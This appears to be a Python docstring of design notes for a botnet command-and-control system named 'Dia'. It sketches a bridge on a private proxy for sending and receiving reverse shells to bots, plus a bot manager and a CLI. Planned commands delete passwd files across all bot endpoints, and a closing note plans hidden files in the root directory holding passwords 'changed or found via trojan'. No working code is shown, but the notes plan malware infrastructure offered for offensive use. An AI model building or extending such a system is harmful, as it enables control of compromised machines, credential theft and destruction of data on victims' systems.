''' 

    the rpc system will assist in sending and 
    recieving rshells pertaining to bots with 
    the Dia Bridge.

    LOCAL --> DIA BRIDGE (hosted on priv proxy server)
                  |
        BOT ENDPOINT(S) MANAGER (CRUDS bots and bot info on the network)
                  |
         BOT NETWORK MANAGER (writes bot instructions and cmds to CLI)
                  |
               DIA CLI

                  
commands:

pause: pauses all operations on machine.

use a system of callbacks to utilize their
overhead function's scope to check for certain 
conditions like a pause boolean 

the CLI does not use a for loop and user_input to run
it takes parameters directly from the command_line when
shell.launch() is called. therefore this CLI will utilize
and interpreter to operate on AST input.

rm -from -all -passkey
rm -from -ip 10.0.0.0 -passkey
rm --from -ip 10.0.0.0 -lan 192.168.1.7 --passkey
 -delete all passwd files from all bot endpoints
 
 -hint: you need an internal remover function that 
 probably takes a callback that searches for what to remove 
 and removes it. this way it can be used universally amongst big flags (--flag).

---------------------------
notes: 

 - put hidden files in the root directory with the bot machine's encrypted 
   password that is either changed or found via trojan of left 
   on machine.


'''